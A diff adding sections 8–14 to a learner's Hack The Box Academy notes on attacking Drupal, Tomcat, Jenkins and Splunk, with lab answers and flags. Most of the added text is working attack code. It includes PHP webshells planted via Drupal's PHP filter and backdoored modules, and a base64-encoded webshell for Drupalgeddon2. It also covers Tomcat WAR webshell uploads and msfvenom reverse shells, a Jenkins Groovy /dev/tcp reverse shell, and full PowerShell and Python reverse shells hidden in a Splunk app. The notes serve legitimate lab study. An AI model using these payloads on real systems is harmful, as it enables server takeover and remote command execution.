@@ -1,6 +1,6 @@
 # HTB Academy — Attacking Common Applications: Module Notes
 
-**Status:** In progress (Sections 1–7 of 33 complete)
+**Status:** In progress (Sections 1–14 of 33 complete)
 
 ---
 
@@ -299,3 +299,353 @@ More capable for Drupal than Joomla. Finds plugins, version, interesting URLs.
 - Q2 password: `jessica1`
 - Q3 bash user: `webadmin`
 - Q4 flag: `l00k_ma_unAuth_rc3!` (at `/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt`)
+
+---
+
+## Section 8 — Attacking Drupal
+
+### PHP Filter Module (Drupal 7, pre-auth requires admin)
+1. Login as admin → `admin/modules` → enable **PHP filter**
+2. Content → Add content → Basic page
+3. Body: `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`
+4. Text format: **PHP code** → Save (note the node number)
+5. Execute: `curl -s "http://<target>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"`
+
+For Drupal 8+: download and install `php-8.x-1.1.tar.gz` module first, then same steps.
+
+### Backdoored Module Upload (any version with admin)
+1. Download a real module: `wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
+2. Extract: `tar xvf captcha-8.x-1.2.tar.gz`
+3. Create webshell `shell.php`: `<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>`
+4. Create `.htaccess`:
+```
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+```
+5. Move both into captcha dir, repackage: `tar cvf captcha.tar.gz captcha/`
+6. Admin → Extend → Install new module → upload archive
+7. Execute: `curl -s <target>/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`
+
+### Drupalgeddon (CVE-2014-3704) — Drupal 7.0–7.31, pre-auth SQLi
+```
+python2.7 drupalgeddon.py -t http://<target> -u hacker -p pwnd
+```
+Creates admin user → log in → use PHP filter or module upload for RCE.
+Metasploit: `exploit/multi/http/drupal_drupageddon`
+
+### Drupalgeddon2 (CVE-2018-7600) — Drupal < 7.58 / < 8.5.1, unauthenticated RCE
+```
+git clone https://github.com/a2u/CVE-2018-7600
+```
+Modify script to write a webshell:
+```
+echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+```
+Run PoC → `curl http://<target>/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id`
+
+### Drupalgeddon3 (CVE-2018-7602) — authenticated RCE, requires session cookie
+Metasploit: `exploit/multi/http/drupal_drupageddon3`
+- Set `DRUPAL_SESSION`, `DRUPAL_NODE`, `VHOST`, `RHOSTS`, `LHOST`
+
+### Key Gotchas
+- Flag files are uniquely named — always `ls` the target directory first
+- All vhosts on same box — RCE on any instance reaches all webroot directories
+- drupal-qa (7.30) → Drupalgeddon; drupal-dev → Drupalgeddon2; drupal-acc → Drupalgeddon3
+
+### Lab Answers
+- Section 8 flag: `DrUp@l_drUp@l_3veryWh3Re!` (at `/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt`)
+- Got RCE via Metasploit `exploit/multi/http/drupal_drupageddon` on drupal-qa (Drupal 7.30)
+
+---
+
+## Section 9 — Tomcat: Discovery & Enumeration
+
+### Fingerprinting
+```
+curl -s http://<target>:<port>/docs/ | grep Tomcat
+curl -sI http://<target>:<port>/login
+```
+- `X-Jenkins` header reveals version on Jenkins; `X-Hudson` also present
+- `/docs/` page title contains version
+- 404 error page reveals version on older configs
+
+### Key Paths
+- Manager GUI: `/manager/html` (requires `manager-gui` role)
+- Host Manager: `/host-manager/html`
+- Default port: 8080 (also common: 8180, 8443)
+
+### Key Files
+- `conf/tomcat-users.xml` — credentials and roles
+- `webapps/<app>/WEB-INF/web.xml` — routes and servlet mappings (useful for LFI)
+
+### Roles
+| Role | Access |
+|---|---|
+| manager-gui | HTML GUI + status pages |
+| manager-script | Text API + status pages |
+| manager-jmx | JMX proxy + status pages |
+| manager-status | Status pages only |
+
+### Gobuster Enumeration
+```
+gobuster dir -u http://<target>:<port>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+```
+
+### Lab Answers
+- web01.inlanefreight.local:8180 version: `10.0.10`
+- admin role in config example: `admin-gui`
+
+---
+
+## Section 10 — Attacking Tomcat
+
+### Login Brute Force
+```
+msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set VHOST <vhost>; set RPORT <port>; set STOP_ON_SUCCESS true; set RHOSTS <ip>; run"
+```
+Default wordlists: `tomcat_mgr_default_users.txt` / `tomcat_mgr_default_pass.txt`
+
+### WAR File Upload (requires manager-gui role)
+```
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp
+```
+
+**Upload via curl (requires session cookie + CSRF token — two-step):**
+```
+curl -c /tmp/tc.txt -b /tmp/tc.txt -u <user>:<pass> -s "http://<target>/manager/html" -o /tmp/tc_page.html
+grep -o 'CSRF_NONCE=[A-F0-9]*' /tmp/tc_page.html | head -1
+curl -c /tmp/tc.txt -b /tmp/tc.txt -u <user>:<pass> -F "deployWar=@backup.war" "http://<target>/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=<TOKEN>"
+```
+
+**Execute via webshell:**
+```
+curl -s -G "http://<target>/backup/cmd.jsp" --data-urlencode "cmd=id"
+```
+- Use `--data-urlencode` with `-G` — `Runtime.exec()` doesn't interpret shell operators
+- No `2>/dev/null` — it gets passed literally and breaks the command
+
+### msfvenom WAR (reverse shell instead of webshell)
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4443 -f war > backup.war
+nc -lnvp 4443
+```
+Upload same way, then browse to `/backup/` to trigger.
+
+### CVE-2020-1938 Ghostcat (pre-auth LFI, AJP port 8009)
+Affects all Tomcat < 9.0.31 / < 8.5.51 / < 7.0.100
+```
+nmap -sV -p 8009,8080 <target>
+python2.7 tomcat-ajp.lfi.py <target> -p 8009 -f WEB-INF/web.xml
+```
+Can only read files within the webapps folder.
+
+### Key Gotchas
+- `manager-gui` role does NOT allow `/manager/text/` API — need `manager-script` for that
+- CSRF token is session-bound — must fetch token and upload using the same cookie jar
+- Flag files are in webapps directory, not at a predictable path — always `ls` first
+
+### Lab Answers
+- Creds: `tomcat:root`
+- Flag: `t0mcat_rc3_ftw!` (at `/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`)
+
+---
+
+## Section 11 — Jenkins: Discovery & Enumeration
+
+### Fingerprinting
+```
+curl -sI http://<target>:<port>/login
+```
+- `X-Jenkins` response header contains version
+- `X-Hudson` header also present (Jenkins was originally Hudson)
+- Default port: 8080 (also common: 8000)
+- Management/slave communication: port 5000
+
+### Auth Options
+- Jenkins own user database (default)
+- LDAP, Unix user database, no authentication
+- Default trial creds: `admin:admin`
+
+### Lab Answers
+- jenkins.inlanefreight.local:8000 version: `2.303.1`
+
+---
+
+## Section 12 — Attacking Jenkins
+
+### RCE via Groovy Script Console (`/script`)
+The script console runs Apache Groovy on the Jenkins controller — equivalent to a webshell.
+
+**Execute OS command:**
+```groovy
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+```
+
+**Via curl (requires crumb + session cookie together):**
+```python
+import requests
+
+url = "http://<target>:<port>"
+auth = ("admin", "admin")
+
+s = requests.Session()
+crumb_json = s.get(f"{url}/crumbIssuer/api/json", auth=auth).json()
+crumb = crumb_json["crumb"]
+field = crumb_json["crumbRequestField"]
+
+script = """
+def cmd = 'cat /path/to/flag'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+"""
+
+r = s.post(f"{url}/scriptText", auth=auth, headers={field: crumb}, data={"script": script})
+print(r.text)
+```
+
+**Reverse shell (Linux):**
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+**Windows command execution:**
+```groovy
+def cmd = "cmd.exe /c dir".execute();
+println("${cmd.text}");
+```
+
+### Key Gotchas
+- Jenkins CSRF crumb is session-bound — must use `requests.Session()` so crumb and POST share the same session
+- Fetching crumb with one request and POSTing with another (different session) = 403
+- Jenkins often runs as root (Linux) or SYSTEM (Windows) — high-value target
+
+### Lab Answers
+- Creds: `admin:admin`
+- Flag: `f33ling_gr00000vy!` (at `/var/lib/jenkins3/flag.txt`)
+
+---
+
+## Section 13 — Splunk: Discovery & Enumeration
+
+### Fingerprinting
+```
+curl -sk https://<target>:8089/services/server/info | grep version
+```
+- Web UI: port 8000
+- Management/REST API: port 8089
+- Version exposed unauthenticated via REST API even when web UI requires auth
+
+### Auth Notes
+- Default creds (older): `admin:changeme`
+- Trial converts to free (no auth) after 60 days
+- Free version: no authentication on web UI
+- Common weak passwords: `admin`, `Welcome1`, `Password123`, `Welcome`, `changeme`
+
+### Test credentials via REST API
+```
+curl -sk -X POST "https://<target>:8089/services/auth/login" -d "username=admin&password=<pass>" -w " %{http_code}"
+```
+200 + sessionKey = valid creds.
+
+### Lab Answers
+- Version: `8.2.2`
+- OS: Windows Server
+
+---
+
+## Section 14 — Attacking Splunk
+
+### RCE via Custom App (scripted input)
+Splunk runs scripted inputs automatically — plant a reverse shell script in a custom app.
+
+**Directory structure:**
+```
+splunk_shell/
+├── bin/
+│   ├── run.ps1    (PowerShell reverse shell — Windows)
+│   ├── run.bat    (calls run.ps1 — Windows)
+│   └── rev.py     (Python reverse shell — Linux)
+└── default/
+    └── inputs.conf
+```
+
+**inputs.conf (Windows):**
+```
+[script://.\bin\run.bat]
+disabled = 0
+sourcetype = shell
+interval = 10
+```
+
+**inputs.conf (Linux):**
+```
+[script://./bin/rev.py]
+disabled = 0
+interval = 10
+sourcetype = shell
+```
+
+**run.bat:**
+```batch
+@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+Exit
+```
+
+**run.ps1 (PowerShell reverse shell):**
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+**rev.py (Linux):**
+```python
+import sys,socket,os,pty
+ip="<LHOST>"
+port="<LPORT>"
+s=socket.socket()
+s.connect((ip,int(port)))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn('/bin/bash')
+```
+
+**Package and upload:**
+```
+tar -cvzf updater.tar.gz splunk_shell/
+```
+Upload via: Apps → Manage Apps → Install app from file → Browse → Upload (check Upgrade app if re-uploading)
+
+**Get session token via REST API:**
+```
+curl -sk -X POST "https://<target>:8089/services/auth/login" -d "username=admin&password=<pass>"
+```
+
+### Read flag on Windows shell
+```
+type c:\loot\flag.txt
+```
+
+### Key Gotchas
+- Splunk often runs as root (Linux) or SYSTEM (Windows)
+- Use `type` not `cat` to read files in Windows cmd/PowerShell
+- Python socket reverse shell fails on Windows Splunk due to firewall — use PowerShell
+- Use the repo linked in the section for a working pre-built package structure
+- If web UI requires auth but REST API doesn't — test creds via `8089/services/auth/login`
+- Deployment server compromise → can push apps to all Universal Forwarders on the network
+
+### Lab Answers
+- Creds: `admin:Welcome1`
+- Flag: `l00k_ma_no_AutH!` (at `c:\loot\flag.txt`)
+- Shell received as `NT AUTHORITY\SYSTEM`
